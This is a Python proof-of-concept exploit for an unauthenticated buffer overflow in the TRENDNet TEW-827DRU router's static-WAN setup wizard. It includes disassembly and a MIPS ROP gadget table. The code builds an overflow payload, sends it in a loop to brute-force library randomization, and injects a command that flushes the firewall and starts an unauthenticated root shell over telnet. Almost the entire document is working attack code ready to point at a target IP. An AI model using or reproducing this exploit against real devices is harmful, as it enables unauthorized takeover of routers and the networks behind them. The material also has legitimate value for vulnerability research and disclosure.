#!/usr/bin/python3
"""
This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality. Within the setup wizard there is a buffer
overflow processing the primary and secondary DNS servers while configuring the router for static WAN. The vulnerable
disassembly is shown below. wan_primary_dns or wan_secondary_dns can be used for exploitation, this script uses
wan_secondary_dns.

LOAD:0043BC10                 addiu   $s1, $v0, (aSS_0 - 0x4D0000)  # "%s %s"
LOAD:0043BC14                 la      $v0, aTDelay     # "t_delay"
LOAD:0043BC18                 nop
LOAD:0043BC1C                 addiu   $a0, $v0, (aCameoWanWanPri_0 - 0x4C0000)  # "cameo.wan.wan_primary_dns"
LOAD:0043BC20                 la      $v0, safe_getenv
LOAD:0043BC24                 nop
LOAD:0043BC28                 move    $t9, $v0
LOAD:0043BC2C                 bal     safe_getenv
LOAD:0043BC30                 nop
LOAD:0043BC34                 lw      $gp, 0xB0+var_A0($fp)
LOAD:0043BC38                 move    $s0, $v0
LOAD:0043BC3C                 la      $v0, aTDelay     # "t_delay"
LOAD:0043BC40                 nop
LOAD:0043BC44                 addiu   $a0, $v0, (aCameoWanWanSec_0 - 0x4C0000)  # "cameo.wan.wan_secondary_dns"
LOAD:0043BC48                 la      $v0, safe_getenv
LOAD:0043BC4C                 nop
LOAD:0043BC50                 move    $t9, $v0
LOAD:0043BC54                 bal     safe_getenv
LOAD:0043BC58                 nop
LOAD:0043BC5C                 lw      $gp, 0xB0+var_A0($fp)
LOAD:0043BC60                 addiu   $v1, $fp, 0xB0+var_94
LOAD:0043BC64                 move    $a0, $v1         # s
LOAD:0043BC68                 move    $a1, $s1         # format
LOAD:0043BC6C                 move    $a2, $s0
LOAD:0043BC70                 move    $a3, $v0
LOAD:0043BC74                 la      $v0, sprintf
LOAD:0043BC78                 nop
LOAD:0043BC7C                 move    $t9, $v0
LOAD:0043BC80                 jalr    $t9 ; sprintf
LOAD:0043BC84                 nop

The cgi file that contains the exploit was compiled with library randomization enabled meaning the exploit must be
repeatedly thrown until libuClibc gets loaded at the address used as the base in the exploit. Sometimes this is quick,
sometimes it takes a few minutes.

The ROP chain used in the exploit is shown below.
 - rop1 - This router has rather odd behavior, instead of using temporary 's' registers within the function it uses $v0
          and $v1 to move arguments around. Because of this the functions only save $fp and $ra which is kinda hard to
          make useful chains with one registers. The first rop gadget gives us control of $s0 - $s6 to give us a larger
          variety of ROPs available.
 - rop2 - The address of system ends in 0x20, ASCII for space, which we can't directly send in the URL. So, we replace
          the 0x20 with 0x1C and use this gadget to increment the address of system to the proper address.
 - rop3 - Grab a string off the stack and call system with it.

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  |
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                |
|             |               | move    $t9, $s5              |
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 |
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              |
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

The overflow is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import mow
import time
import argparse
import telnetlib


def telnet_connect(host, port):
    """
    Connect to telnet server.

    :param host: Telnet server IP address.
    :type host: str

    :param port: Telnet server listening port.
    :type port: int

    :return: Telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def generate_exploit(host, port, command):
    """
    Generate packet to exploit the target.

    :param host: Target IP address.
    :type host: str

    :param port: Target listening port.
    :type port: int

    :param command: Command to execute on successful exploitation.
    :type command: str

    :return: Packet to send to target.
    :rtype: bytes
    """
    rop1 = 0x3e164
    rop2 = 0x53168
    rop3 = 0x3ca64

    system = 0x57b1c

    overflow = mow.Overflow(0x94, 3, mow.LITTLE_ENDIAN, 0, 0x76fd5000, '1 ')
    overflow.ra = rop1
    overflow.add_to_stack(0x3c, address=rop2)
    overflow.add_to_stack(0x34, address=rop3)
    overflow.add_to_stack(0x2c, address=system)
    overflow.add_to_stack(0x68, command=command.replace(' ', '${IFS}'))
    overflow_string = overflow.generate()

    data = {b'ccp_act': b'set',
            b'action': b'wizard_wan',
            b'cameo.wan.wan_proto': b'static',
            b'cameo.wan.wan_primary_dns': b'1',
            b'cameo.wan.wan_secondary_dns': overflow_string}

    data = b'&'.join(b'%s=%s' % (key, value) for key, value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply_sec.cgi', data=data)
    packet = request.create_packet()
    return packet


def exploit_target(host, port, telnet_port):
    """
    Repeatedly attempt to exploit the target until a reverse shell is established.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param telnet_port: Port to open to establish the telnet connection.
    :type telnet_port: int
    """
    telnet_command = 'iptables -F|telnetd -l /bin/sh -p %d' % telnet_port
    packet = generate_exploit(host, port, telnet_command)

    print('Repeatedly throwing exploit...this may take some time. Shell will appear when it succeeds.')

    tn = telnet_connect(host, telnet_port)
    while tn is None:
        try:
            mow.send_packet(host, port, packet)
        except:
            continue
        tn = telnet_connect(host, telnet_port)
        time.sleep(.1)

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated buffer overflow processing static WAN setup wizard '
                                                 'parameters in the TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int)

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.tport)
